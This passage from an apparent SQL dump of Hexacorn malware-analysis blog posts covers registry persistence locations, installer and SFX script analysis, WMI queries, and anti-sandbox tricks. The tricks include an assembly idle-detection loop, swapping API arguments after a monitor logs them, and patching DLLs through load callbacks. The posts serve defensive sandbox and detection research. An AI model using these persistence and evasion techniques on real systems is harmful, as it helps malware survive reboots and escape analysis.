Downloader\n\n%USERPROFILE%\\Application Data\\Orbit\\conf.dat%USERPROFILE%\\Application Data\\Orbit\\conf.dat\n\n\n Windows Live Messenger\n\nHKCU\\Software\\Microsoft\\MSNMessenger\\AntiVirus\n\n\nMiranda\n\n%USERPROFILE%\\Application Data\\Miranda\\PROFILEFOLDER\\PROFILEFILENAME.dat\n\n\n\n\n\nBeyond good ol’ Run key, Part 3\nhttp://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/\n\nCode-in-the-middle proxy\nApplication Registration (App Paths) hijacking\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\n\n\nText Services (TSF)\nDLL load order\nIIS Server Extensions (ISAPI filters)\nAppCertDlls\n\nHKLM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\n\n\n\nBeyond good ol’ Run key, Part 4\nhttp://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/\n\nHijacking debuggers\n\nStandalone Debugger (32- and 64- bit)\n\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\nHKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\n\n\nNET Debugger (32- and 64- bit)\n\nHKLM\\SOFTWARE\\Microsoft\\.NETFramework\\DbgManagedDebugger\nHKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\.NETFramework\\DbgManagedDebugger\n\n\nScript Debugger\n\nHKCR\\CLSID\\{834128A2-51F4-11D0-8F20-00805F2CD064}\\LocalServer32\\@\n\n\n\n\nHijacking Process Debug Manager\n\nHKLM\\SOFTWARE\\Classes\\CLSID\\{78A51822-51F4-11D0-8F20-00805F2CD064}\\InprocServer32\\@\n\n\nServiceDll Hijack\n\nServiceDll parameter under HKLM\\SYSTEM\\CurrentControlSet\\Services\\\n\n\nMapi32 Stub Library\n\nHKLM\\Software\\Clients\\Mail::(default)\\DLLPath\nHKLM\\Software\\Clients\\Mail::(default)\\DLLPathEx\n\n\nHijacking Client executables\n\nHKLM\\Software\\Clients\\ f.ex.\n\nHKLM\\SOFTWARE\\Clients\\Mail\\Windows Mail\\InstallInfo\\HideIconsCommand\nHKLM\\SOFTWARE\\Clients\\Mail\\Windows Mail\\InstallInfo\\ReinstallCommand\nHKLM\\SOFTWARE\\Clients\\Mail\\Windows Mail\\InstallInfo\\ShowIconsCommand\n\n\n\n\nWindows 2000 Welcome\n\nC:\\WINNT\\Welcome.exe via\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\tips\\Show\n\n\n\nBeyond good ol’ Run key, Part 5\nhttp://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/\n\nA number of Phantom DLLs that are loaded as code via LoadLibrary variants, but not present on a system in its default install\n\nBeyond good ol’ Run key, Part 6\nhttp://www.hexacorn.com/blog/2014/01/10/beyond-good-ol-run-key-part-6-2/\n\nVisual Basic persistence via\n\nHKLM\\SOFTWARE\\Microsoft\\VBA\\Monitors\n\n\n\nBeyond good ol’ Run key, Part 7\nhttp://www.hexacorn.com/blog/2014/02/09/beyond-good-ol-run-key-part-7/\n\nOasys (Office Automation System) loading %windir%\\system32\\BTLOG.DLL via\n\nHKLM\\SOFTWARE\\Microsoft\\OASys\\OAClient\n\n\n\nBeyond good ol’ Run key, Part 8\nhttp://www.hexacorn.com/blog/2014/02/21/beyond-good-ol-run-key-part-8-2/\n\nPersistence via Jumplists, including Multiple Link functionality that launches more than one application with one click\n\nBeyond good ol’ Run key, Part 9\nhttp://www.hexacorn.com/blog/2014/03/02/beyond-good-ol-run-key-part-9/\n\nPersistence via Pinned Apps pointing to malicious components\n\nBeyond good ol’ Run key, Part 10\nhttp://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/\n\nHKCU\\Software\\Microsoft\\Office Test\\Special\\Perf (used by Sofacy)\nWWLIBcxm.DLL proxy loaded via\n\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\n\n\n\nBeyond good ol’ Run key, Part 11\nhttp://www.hexacorn.com/blog/2014/04/27/beyond-good-ol-run-key-part-11/\n\nAdded large repository of autoruns mechanisms\n\nhttp://gladiator-antivirus.com/forum/index.php?showtopic=24610\n\n\nPersistence via modified Environment variables (permanently set inside the Registry)\n\nHKCU\\Environment\n\n\n\n \nBeyond good ol’ Run key, Part 12\nhttp://www.hexacorn.com/blog/2014/05/21/beyond-good-ol-run-key-part-12/\nBeyond good ol’ Run key, Part 13\nhttp://www.hexacorn.com/blog/2014/06/18/beyond-good-ol-run-key-part-13/\nBeyond good ol’ Run key, Part 14\nhttp://www.hexacorn.com/blog/2014/07/08/beyond-good-ol-run-key-part-14/\nBeyond good ol’ Run key, Part 15\nhttp://www.hexacorn.com/blog/2014/08/04/beyond-good-ol-run-key-part-15/\nBeyond good ol’ Run key, Part 16\nhttp://www.hexacorn.com/blog/2014/08/27/beyond-good-ol-run-key-part-16/\nBeyond good ol’ Run key, Part 17\nhttp://www.hexacorn.com/blog/2014/08/31/beyond-good-ol-run-key-part-17/\nBeyond good ol’ Run key, Part 18\nhttp://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/\nBeyond good ol’ Run key, Part 19\nhttp://www.hexacorn.com/blog/2014/12/04/beyond-good-ol-run-key-part-19/\nBeyond good ol’ Run key, Part 20\nhttp://www.hexacorn.com/blog/2015/01/01/beyond-good-ol-run-key-part-20/\nBeyond good ol’ Run key, Part 21\nhttp://www.hexacorn.com/blog/2015/01/03/beyond-good-ol-run-key-part-21/\nBeyond good ol’ Run key, Part 22\nhttp://www.hexacorn.com/blog/2015/01/06/beyond-good-ol-run-key-part-22/\nBeyond good ol’ Run key, Part 23\nhttp://www.hexacorn.com/blog/2015/01/09/beyond-good-ol-run-key-part-23/\nBeyond good ol’ Run key, Part 24\nhttp://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/\nBeyond good ol’ Run key, Part 25\nhttp://www.hexacorn.com/blog/2015/01/28/beyond-good-ol-run-key-part-25/\nBeyond good ol’ Run key, Part 26\nhttp://www.hexacorn.com/blog/2015/01/28/beyond-good-ol-run-key-part-26/\nBeyond good ol’ Run key, Part 27\nhttp://www.hexacorn.com/blog/2015/02/19/beyond-good-ol-run-key-part-27/\nBeyond good ol’ Run key, Part 28\nhttp://www.hexacorn.com/blog/2015/02/23/beyond-good-ol-run-key-part-28/\nBeyond good ol’ Run key, Part 29\nhttp://www.hexacorn.com/blog/2015/03/13/beyond-good-ol-run-key-part-29/\nBeyond good ol’ Run key, Part 30\nhttp://www.hexacorn.com/blog/2015/04/26/beyond-good-ol-run-key-part-30/\nBeyond good ol’ Run key, Part 31\nhttp://www.hexacorn.com/blog/2015/05/29/beyond-good-ol-run-key-part-31/\nBeyond good ol’ Run key, Part 32\nhttp://www.hexacorn.com/blog/2015/09/12/beyond-good-ol-run-key-part-32/\nBeyond good ol’ Run key, Part 33\nhttp://www.hexacorn.com/blog/2015/10/20/beyond-good-ol-run-key-part-33/\nBeyond good ol’ Run key, Part 34\nhttp://www.hexacorn.com/blog/2016/02/16/beyond-good-ol-run-key-part-34/\nBeyond good ol’ Run key, Part 35\nhttp://www.hexacorn.com/blog/2016/03/01/beyond-good-ol-run-key-part-35/\nBeyond good ol’ Run key, Part 36\nhttp://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/\nBeyond good ol’ Run key, Part 37\nhttp://www.hexacorn.com/blog/2016/03/26/beyond-good-ol-run-key-part-37/\nBeyond good ol’ Run key, Part 38\nhttp://www.hexacorn.com/blog/2016/05/27/beyond-good-ol-run-key-part-38/\nBeyond good ol’ Run key, Part 39\nhttp://www.hexacorn.com/blog/2016/05/30/beyond-good-ol-run-key-part-39/\nBeyond good ol’ Run key, Part 40\nhttp://www.hexacorn.com/blog/2016/06/02/beyond-good-ol-run-key-part-40/\nBeyond good ol’ Run key, Part 41\nhttp://www.hexacorn.com/blog/2016/07/08/beyond-good-ol-run-key-part-41/\nBeyond good ol’ Run key, Part 42\nhttp://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\nBeyond good ol’ Run key, Part 43\nhttp://www.hexacorn.com/blog/2016/07/28/beyond-good-ol-run-key-part-43/\nShare this :)', 'Hexacorn', 'http://www.hexacorn.com/blog/2015/07/02/links-to-post-series/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (221, 'Permanent Link to Enter Sandbox – part 7: Hello, مرحبا, 您好, здравствуйте, γεια σας', 'Hexacorn', 'June 27, 2015 ', 'Most of modern applications use Windows APIs that rely on Unicode (or, at least its subset) and as such they rely on ‘W’ versions of the APIs as opposed to older apps that used ANSI ‘A’ versions (f.ex. CreateFileW vs. CreateFileA). Of course, the native APIs rely on Unicode for a long time. Unicode makes it easy and avoids ambiguities associated with the ANSI encodings which can always be mapped to many character sets – depending on the OS/application version. This is why running old localized applications on English OS leads to some unrecognizable garbage characters shown on the UI.\nThe number of old apps that rely on ANSI functions is still very huge and not taking them into account makes it harder to cherry-pick some interesting clues from the samples. Some of these clues can make it to the final report as well and actually enrich it a lot.\nLet’s look at an example.\nAn application does something, and then displays a message box with a caption ‘Îøèáêà’ saying ‘Çàïðàøèâàåìûé ôàéë íå íàéäåí’.\n\nObviously, it doesn’t tell us much.\nWhat if we attempted to translate it blindly into Unicode using the most popular ANSI encodings?\nWe would get sth like this:\n1250 (Central Europe)           = Îřčáęŕ\r\n1251 (Cyrillic)                 = Ошибка\r\n1252 (Latin I)                  = Îøèáêà\r\n1253 (Greek)                    = Ξψθακΰ\r\n1254 (Turkish)                  = Îøèáêà\r\n1255 (Hebrew)                   = ־רטבךא\r\n1256 (Arabic)                   = خّèلêà\r\n1257 (Baltic)                   = Īųčįźą\r\n1258 (Vietnam)                  = Îøèáêà\r\n 874 (Thai)                     = ฮ๘่แ๊เ\r\n 932 (Japanese Shift-JIS)       = ﾎ碎\r\n 936 (Simplified Chinese GBK)   = 硒栳赅\r\n 949 (Korean)                   = 丘矮魏\r\n 950 (Traditional Chinese Big5) = 昮魨罻\nfor the caption, and for the message:\n1250 (Central Europe)           = Çŕďđŕřčâŕĺěűé ôŕéë íĺ íŕéäĺí\r\n1251 (Cyrillic)                 = Запрашиваемый файл не найден\r\n1252 (Latin I)                  = Çàïðàøèâàåìûé ôàéë íå íàéäåí\r\n1253 (Greek)                    = Ηΰοπΰψθβΰεμϋι τΰιλ νε νΰιδεν\r\n1254 (Turkish)                  = Çàïğàøèâàåìûé ôàéë íå íàéäåí\r\n1255 (Hebrew)                   = ַאןנארטגאולי פאיכ םו םאיהום\r\n1256 (Arabic)                   = اàïًàّèâàهىûé ôàéë يه يàéنهي\r\n1257 (Baltic)                   = Ēąļšąųčāąåģūé ōąéė ķå ķąéäåķ\r\n1258 (Vietnam)                  = Çàïđàøèâàǻûé ôàéë íå íàéäåí\r\n 874 (Thai)                     = วเ๏๐เ๘่โเๅ์๛้ ๔เ้๋ ํๅ ํเ้ไๅํ\r\n 932 (Japanese Shift-JIS)       = ﾇ瑜籵褌隆 鴉 淲 浯鱠褊\r\n 936 (Simplified Chinese GBK)   = 青镳帏桠噱禧?羿殡 礤 磬殇屙\r\n 949 (Korean)                   = 행穽星外齧荏?牒雨 張 壯藕孼\r\n 950 (Traditional Chinese Big5) = 瀔僤魤馲檞?邍澣 翴 縺毈樇\nEven without the knowledge of the specific languages it’s easy to pick up the correct mapping which is ‘Ошибка’ (meaning ‘Error’) for the caption, and ‘Запрашиваемый файл не найден’ (meaning ‘File not found’) in Russian.\nWe can confirm it by running it on the Russian OS:\n\nThe exercise above my friend is an attempt to make a sandbox polyglottic. Add some modules to recognize the most common languages and who knows, maybe it will be able to recognize that these calls to FindWindow know no linguistical boundaries and are… not too friendly:\n\nСкрытый процесс запрашивает сетевой доступ\nHidden Process Requests Network Access\nEin versteckter Prozess verlangt Netzwerkzugriff.\nUn proceso oculto solicita acceso a la red\nUn processus cache requiert une connexion reseau.\nВнимание: некоторые компоненты изменились\nWarning: Components Have Changed\nWarnung: Einige Komponenten wurden verandert.\nAdvertencia: Los componentes han cambiado\nAvertissement : Les composants ont change\nMenedżer Zadań Windows\nСоздать правило для\nCreate rule for\nRegel fur\nCrear regla para\nCreer une regle pour\n瑞星杀毒软件\n登录信息\n文件保护\n월드 오브 워크래프트\n삼국지\n하이로우2\n\nShare this :)', 'Batch Analysis, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2015/06/27/enter-sandbox-part-7-hello-%d9%85%d8%b1%d8%ad%d8%a8%d8%a7-%e6%82%a8%e5%a5%bd-%d0%b7%d0%b4%d1%80%d0%b0%d0%b2%d1%81%d1%82%d0%b2%d1%83%d0%b9%d1%82%d0%b5-%ce%b3%ce%');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (222, 'Permanent Link to Enter Sandbox – part 6: The Nullsoft hypothesis and other installers’ conundrums', 'Hexacorn', 'June 26, 2015 ', 'Monitoring system services, Native APIs, Windows APIs and COM is a good start, but the monitoring capabilities can be always extended. In this post I will focus on one particular category of monitoring which I believe is often overlooked.\nI am talking about installers and their plug-ins – with a main focus on the Nullsoft Installer (although I will talk about various installers in general).\nI wrote about, or at least mentioned installers a couple of times before:\n\nFile Formats ZOO – Installers\nMZ File format flavors & malware\nTop 100+ malicious types of 32-bit PE files\n\nThe reason why monitoring installers can be interesting is that it may provide an extra insight in the working of a binary (mind you, my focus in this series is on manual in-depth analysis more than automated analysis /although the latter could still benefit from discussed topics too/).\nAnd why is that interesting?\n\nThere are classes of malware that rely on installers as a main way of infection\nThere are plug-ins (DLLs) dropped and loaded by installers that do stuff that may explain why certain things work/don’t work\nSome plug-ins offer decoding/decompression/decryption/anti-sandboxing capabilities – intercepting the function calls responsible for this functionality can sched some more light on the internal working of the malware (and help to write behavioral rules)\nSome installers use encryption and passwords can be only intercepted by analyzing the internals of the installer/plug-ins\nSome plug-ins use novelty techniques to do stuff – they leverage COM, .NET, WMI to retrieve information about the system, download payloads, etc. – some of these cannot be intercepted on the Native/Windows API level and even if they are, the context is lost\netc.\n\nBefore we talk about the dynamic analysis of installers let’s look at a typical installer first.\nStatic analysis of installers\nA typical installer contains a stub followed by a compressed/encrypted data blob. The stub is a legitimate program written by whoever designed the installer. As such, its detection cannot be used as a reliable mechanism to detect the malware using the installer since the signature (at least, not w/o looking at the appended data) would ‘hit’ many legitimate applications sharing the very same stub. In other words, the actual malware is never ‘seen’ as it is hidden in the package handled by ‘the always-clean’ stub. Static analysis of such installer files is hard, because it requires someone to write an unpacker – one that is dedicated to that particular installer (or, more specifically – its particular version), test it and then it may hopefully manage to handle a class of installers.\nThe problem of course is that:\n\nthere are lots of different installers\nthere are lots of very similar installers, but created either as a result of evolution (subsequent versions, localized versions, ANSI/Unicode, etc.), or private/customized versions that are spin-offs of legitimate repos available online (these f.ex. wipe out markers and change bits here and there to make the unpacking impossible w/o manual effort)\n\nThe net result is that it’s hard for the unpacker to handle it all and static analysis may simply not work (again, unless someone uses a dedicated naive algorithmic detection that could work f.ex. like this: detect known stub, check size of appended data, if matches the range, check some specific values in the appended data region, then ‘detect’; of course, such detection is useless since it is not generic as it only matches 1-1. i.e. each file requires a dedicated signature).\nDetection of dropped files makes it a bit easier for the AV that can pick them up during run-time, but there is really nothing that could prevent malware author from keeping the main payload inside the actual installer and making it simply run persistently on the system. Having only the installer to look at may be then a relatively difficult target for manual analysis.\nLuckily, the RCE community has addressed unpacking of many popular installers and there are plenty of tools that help with a task of a decompilation; including, but not limited to:\n\n7Z decompiles many files, including SFX files; earlier versions of 7z decompile even some versions of the Nullsoft installers\nInnoSetup installers can be decompiled by Inno Setup Unpacker\nAutoIt executables (not really installers, but kinda similar) can be unpacked with Exe2Aut\nThere are many decompilers for less popular installers (it’s easy to find them online) – there is also a dedicated project that focuses on decompiling all the possible goodness called Universal Extractor – at this stage project seems to be stalled, but it’s still a very good tool for many installers\nMany installers can be decompiled by the Plugins for Total Commander: InstallExplorer 0.9.2, InstallExporer Port \nRARSFX can be decompiled using winrar/rar\netc.\n\nThere are also ways to extract some data from files f.ex.:\n\n7ZSFX files\n\n<installer filename>  -sfxconfig foo – ‘sfxconfig’ is a command that allows to extract comments from the sfx file and save it to a ‘foo’ file – an example of an extracted config file that instructs SFX to execute malware.exe file after the installation is shown below (GUIMode = “2” – hides the GUI/silent mode/, “hidcon:” prefix is used to hide the console window)\n;!@Install@!UTF-8!\nGUIMode=\"2\"\nInstallPath=\"%APPDATA%\"\nRunProgram=\"hidcon:%APPDATA%\\malware.exe\"\n;!@InstallEnd@!\n\n\n\nRAR SFX files\n\nrar cw foo – ‘cw’ is a command that allows to extract comments from the .rar archive (including sfx) and save it to a ‘foo’ file – an example of a SFX file that instructs SFX to execute malware.exe file after the installation is shown below\n;The comment below contains SFX script commands\nSetup=malware.exe\n\n\n\n\nSo, static analysis are often possible to certain extent and all the available tools can make it relatively painless. I think it would definitely interesting to see some of these commands and tools deployed by commercial sandboxes as well – the reporting capabilities would increase a lot.\nDynamic analysis of installers\nComing back to the dynamic analysis of installers – you may still wonder why would we even go this path if there are so many tools and tricks available on the static level.\nHere is why – the example below shows some logs from my PoC monitor for some of the Nullsoft installer Plug-Ins:\nCall::in (*(i,i,i,i)i.r1)\r\nCall::out=\r\nCall::in (USER32::GetWindowRect(ir2,ir1))\r\nCall::out=131418\r\nCall::in (USER32::MapWindowPoints(i0,ir0,ir1,i1))\r\nCall::in (*1545016(i.r6,i.r7))\r\nCall::in (USER32::GetClientRect(ir2,ir1))\r\nCall::in (*1545016(i,i,i.r8,i.r9))\r\nCall::in (*1545016(i,i,i.r3,i.r4))\r\nCall::in (USER32::SetWindowPos(ir2,i,i,i,ir3,ir4,i6))\r\nCall::in (USER32::CreateWindowEx(i0,t \"Button\",t \"Make JeezBar my default search engine\",i 0x40000000|0x10000000|0x04000000|0x00010000|0x00000000|0x00000C00|0x00000003|0x00002000,ir6,ir7,ir8,ir9,ir0,i666,i0,i0)i.r2)\r\nCall::in (USER32::CreateWindowEx(i0,t \"Button\",t \"Make JeezBar my home page\",i 0x40000000|0x10000000|0x04000000|0x00010000|0x00000000|0x00000C00|0x00000003|0x00002000,ir6,ir7,ir8,ir9,ir0,i667,i0,i0)i.r3)\r\nCall::in (USER32::CreateWindowEx(i0,t \"Button\",t \"Restart IE (if running)\",i 0x40000000|0x10000000|0x04000000|0x00010000|0x00000000|0x00000C00|0x00000003|0x00002000,ir6,ir7,ir8,ir9,ir0,i668,i0,i0)i.r4)\nAnother example:\nCall::in (kernel32::GetTickCount()i .r0)\r\nCall::out=4847734\r\nget (szURL=hxxp://dyn.flingstone.com/trackedevent.aspx?ver=0.0.1.0&rnd=4847734)\r\nCall::in (kernel32::CreateMutexA(i 0, i 0, t \"thlp_mutex\") ?e)\r\nCall::out=SendRequest Error\r\nCall::out=1706281\r\nget (szURL=hxxp://dyn.flingstone.com/vic.aspx?ver=0.0.1.0&rnd=1706281)\nAs you can see, you can instantly discover the internal working of the Nullsoft Script used by the installer. None of these can be seen using standard API monitoring. If you do offline analysis, intercepting some of these calls may give you clues that otherwise would be very difficult to obtain (e.g. URLs, sequence of internal instructions, possible log messages, etc.).\nNow, how would you go about monitoring these calls?\nSince I mentioned I am going to talk about Nullsoft Installer I will focus only on this particular installer here.\nAt this moment of time, there are at least 430+ versions of Nullsoft Installer in my repository. These come in various forms and flavors – lots of various versions, localized, etc. there is probably more than I counted, since many of the custom ones are modified in a way that makes it harder to distinguish them in a generic fashion. In any case, it’s quite a variety.\nWhat is common about all these varieties is that they share plug-ins; there are a couple of plug-ins that are very popular f.ex. system, or inetc, execcmd, nsprocess, etc., but this is just a tip of the iceberg…\nAfter running some scripts and hacking things around I counted over 5K different Nullsoft plugins and it was quite a clumsy work, so I bet there is at least twice as much \nWhere do we take it from here? Pick up the most common ones, recognize them when they are loaded, hook their functions and … log them.\nJust in case it was not obvious yet – note that despite sharing the same name you may find out that many of them are different between each other – some process ANSI, some Unicode. Some implement additional functionality and all they share is a name and… a list of exported functions.\nIn any case, for the most popular ones it may add an extra layer of information and help in creating behavioral rules as well as getting to understand the inner workings of the samples.\nShare this :)', 'Batch Analysis, Clustering, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2015/06/26/enter-sandbox-part-6-the-nullsoft-hypothesis-and-other-installers-conundrums/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (223, 'Permanent Link to Using race conditions as an antisandbox trick', 'Hexacorn', 'June 25, 2015 ', 'I have had this idea for a while and today I finally implemented it. My implementation is pretty lame and only affects those monitoring solutions that rely on hooking or intercepting user-mode APIs, but after all – it’s just a proof of concept (plus, there is a possibility of implementing similar thingie in the kernel mode too).\nSo the idea goes as follows:\nIn a typical scenario, when an execution flow hits the address of the API (the one that sample is calling), the API hook takes over, or the monitor intercepts the fact API was called by recognizing that instruction pointer hits the known address of the API. Once it happens the monitor intercepts the function arguments and these will end up in the logs. Some monitors also intercept the moment when the API returns – this is handy as it allows to intercept buffers modified by the APIs.\nOf course, the need to either hook APIs, or recognize when they are called is a subject to many evasions f.ex.:\n\none can detect hooks\n\nchecking if functions are starting with JMPs or short privileged instructions\ncross-referencing their code with a code read directly from DLL’s image (a file)\none can use a legitimately looking call and trace it (using f.ex. TF=1) to see if the code is going through any region not mapped to a legitimate OS DLL (this usually means either malware, or some monitor is hooking APIs)\n\n\none can bypass hooks/tracers/monitors\n\nusing stolen bytes (length disassembler to copy code to a diff. buffer and call API via such a trampoline)\none can call the address a bit earlier than API (typically APIs are preceded by a series of NOPs) – this is not a strong evasion per se, but it may fool a tracer/emulator trying to match call instruction operand with the list of actual addresses of APIs that this operand is potentially pointing to\none can call the address a bit further than the API start (‘mov edi, edi’ is usually there and can be skipped; some common  instructions f.ex. ‘push’ can be emulated)\n\n\none can use a different API (lots of them do the very same thing)\none can use functions inline\netc.\n\nIt crossed my mind that one could instrument the code execution in a way that it would allow the monitor to intercept calls to APIs and their arguments, while it would quietly swap arguments ‘on the fly’ after it passed the monitoring stage.\nSo it would look like this:\n\nprogram calls an API\nmonitor/interceptor takes control/recognizes API & logs its arguments\nright before the control is passed to OS to actually execute the API and do the thing it is supposed to do (e.g. create file), the argument (f.ex. file name) would get swapped to something else\n\nThe result would be that the report would contain a reference to incorrect argument(s) – suffering from falsified reality, because it failed to recognize a race condition.\nOne may need to choose carefully when the code needs to swap the arguments of the potentially monitored function. It’s not an easy task since there is a lot of things going on and finding an internal point in the food chain where this data could be swapped may be tricky. Many internal functions copy data from one buffer to another and once the data is copied it cannot be controlled/modified anymore in an easy way.\nAssuming we can control the data we can come up with some ideas on how to mod it.\nThe simplest way could be to choose a ‘lower’ API in the food chain so f.ex. program could be calling Sleep API, while at the same time hooking NtDelayExecution to patch the data passed to Sleep with something else. Monitors logging Sleep would get fooled. Obviously, most of sandboxes nowadays monitor NtDelayExecution so it wouldn’t work in real life, but it’s just one of the ideas.\nAnother way to detect access to the data could rely on leveraging page access rights (e.g. page guard, or no access), or – alternatively – a null selector. This could guarantee that access to data (either specific one that we want to monitor, or _any_ data if null selector was used) would generate an exception. An exception handler could then swap the data somewhere ‘inside’ of the monitored API – still, it would be _after_ its arguments have been already logged.\nIn my PoC I used a simple method of monitoring execution of the API via tracing (TF=1); once the tracing exception handler finds the code transitioning execution to kernel mode (f.ex. sysenter instruction) it checks if the argument on the stack is coming from the API call we monitor; it it is the case, it swaps the data.\nSo, the flow goes like this:\n\nSet up an exception handler\nEnable tracing (TF=1)\nExecute NtCreateFile API with the file name \\??\\c:\\good\nMonitor execution via tracing; the moment sysenter is detected, check if it is indeed our monitored NtCreateFile – if it is, swap the file name to \\??\\c:\\evil\nOS should create \\??\\c:\\evil file while monitors should report \\??\\c:\\good was created\n\nWhen the below test program is ran on the normal system (or inside VM) it creates the file \\??\\c:\\evil.\nWhat happens if it is monitored? I submitted it to a couple of sandboxes and ran it via some of the available API monitors and I got mixed results. Some of the API monitors got fooled. Some sandboxes I tested it with didn’t really show any results. Some monitors made the program create \\??\\c:\\good file (which is an unexpected behavior; could be a bug in my PoC  ), and some sandboxes reported \\??\\c:\\good as well, but I have no way of checking if the actual file was created, or was it my PoC actually fooling the monitor…\nIf you want to play around, here is the file.\nNote: when you run it you need to kill it manually. This is because seeing that sandboxes didn’t report anything, I added to it a dummy loop that never ends. It creates 〰〰〰 file and then is sleeping for 70 miliseconds not to steal all the CPU cycles.\nShare this :)', 'Anti-*, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2015/06/25/using-race-conditions-as-an-antisandbox-trick/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (224, 'Permanent Link to Using LastSystemRITEventTickCount as a (lame) antisandbox trick', 'Hexacorn', 'June 24, 2015 ', 'LastSystemRITEventTickCount is a member of a _KUSER_SHARED_DATA structure. If you google for this particular field’s description you will eventually find sth along these lines:\nTime in tick count for system-wide last user input across all terminal sessions. For MP performance, it is not updated all the time (e.g. once a minute per session). It is used for idle detection.\nSince the user input is quite important from the sandbox perspective detecting changes (or lack of) of this particular field can act as a trivial (a.k.a. lame) anti-sandboxing trick.\nConsider a simple routine like this:\n   mov edx,ds:[7FFE02E4h] ; get LastSystemRITEventTickCount \r\n   back:\r\n      pushad\r\n      invoke Sleep,70 ; sleep for some time\r\n      popad\r\n      mov eax,ds:[7FFE02E4h] ; get new value of LastSystemRITEventTickCount \r\n      sub eax,edx\r\n      jz  back\r\n   ...\r\n\nWhen ran, it waits for some user input (keyboard, mouse events) and only exits when these happen (sometimes more than one event is needed; this is probably caused by the update intervals).\n\nTrivia fact: the very same value check is at the core of a function BeginIdleDetection.\nAn example demo program can be found here.\nShare this :)', 'Anti-*, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2015/06/24/using-lastsystemriteventtickcount-as-a-lame-antisandbox-trick/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (225, 'Permanent Link to (lame) tricks with LdrRegisterDllNotification', 'Hexacorn', 'June 23, 2015 ', 'It was Andrew (thanks!) who brought LdrRegisterDllNotification to my attention by asking on twitter if anyone has seen any malware using it. I couldn’t find any malware, but the function itself triggered my interest.\nI quickly implemented a proof of concept. It shows how the callback that the API is registering could be utilized as a lame anti-* trick by malware that drops DLLs (in a case I am demoing), and maybe to do a few more tricky things (as I discuss below).\nConsider the first .exe – let’s call it ‘good.exe’.\nWhen executed, it drops a DLL called ‘foo.dll’.\nIt then resolves its one and only export ‘Bar’ and executes the function. The function shows a simple message box with a ‘Good’ message:\nThe second .exe is called ‘better.exe’ (obviously  ).\nIt drops the very same ‘foo.dll’.\nFunctionally, it is almost identical with ‘good.exe’ as it is using the same source code. The only difference is that it registers the callback using a LdrRegisterDllNotification function. From now on, anytime a DLL is loaded the callback function takes control and is free to modify the content of the loaded DLL ‘on the fly’. As such, it can easily patch it and create a complete different memory image from the one we may expect by just looking at a static file ‘dropped’ by the .exe.\nIn my case the change is of a ‘visualame’ type. It’s for us to observe it.\nThe callback does only one thing – it checks if the string at a hardcoded offset inside the loaded DLL is equal to ‘Good’ and swaps it with a new string ‘Evil’; therefore, running the ‘better.exe’ will produce the following result:\n\nThe example is intentionally simple, but there are many things that could be done here – the callback allows one to f.ex.\n\ndisable unwanted DLLs (by f.ex. patching their code)\ndetecting sandbox DLLs at a different stage (also use as a different enumeration method for loaded DLLs)\nswapping data and code of modules on the fly\nresolving API pointers earlier and potentially hooking / patching APIs used later in the code\nintroducing simple, atomic, business logic changes to the executed code (hard to spot) f.ex. modify JNZ to JZ, NOPing some instructions, etc.\netc.\n\nBoth files can be downloaded here.\nNothing ground breaking, but good to know about.\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2015/06/23/lame-tricks-with-ldrregisterdllnotification/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (226, 'Permanent Link to Basic intro to WMI and WQL queries', 'Hexacorn', 'June 19, 2015 ', 'WMI is an important component of Windows OS and everyone knows about it so I won’t get into detail about what it is (read the linked wikipedia article if you want to know). I will focus on practical stuff instead which we come across more and more often.\nI will begin by saying that nowadays lots of malware is using WMI – either to establish a stealthy persistence mechanism, or query various information from the system. This typically is done using WQL queries which are so popular that even a couple of typical OS commands are implemented as ‘processors’ simply interpreting results of many WQL queries instead of actually using old-school APIs.\nA good example is a tasklist.exe. If you ever launched it from a command line and observed a slight delay before it returned the data it is because it has to ‘talk’ to WMI first and sometimes WMI initialization may take a while.\nThis particular program is actually a good example we can use to show what exactly happens when it ‘talks’ to WMI.\nHave a look at the Tasklist.exe log below.\n\nFirst WMI connects to the WMI server – the ‘root\\cimv2’ is a namespace used by most WMI classes\nThen it executes the WQL query\n\n     SELECT \r\n        __PATH,\r\n        ProcessId, \r\n        CSName, \r\n        Caption, \r\n        SessionId, \r\n        ThreadCount, \r\n        WorkingSetSize, \r\n        KernelModeTime, \r\n        UserModeTime  \r\n     FROM \r\n        Win32_Process\n\nThen the result returned by the query is processed using the IWbemClassObject::Get method\nFinally, this obtained data is sent to the the console using a WriteConsoleW function\n\nApart from tasklist.exe, we can also find WQL in taskkill.exe.\nKilling a process requires a different query, one that specifies f.ex. a name of the process:\n     SELECT\r\n        __PATH,\r\n        ProcessId,\r\n        CSName,\r\n        Caption,\r\n        SessionId,\r\n        ThreadCount,\r\n        WorkingSetSize,\r\n        KernelModeTime,\r\n        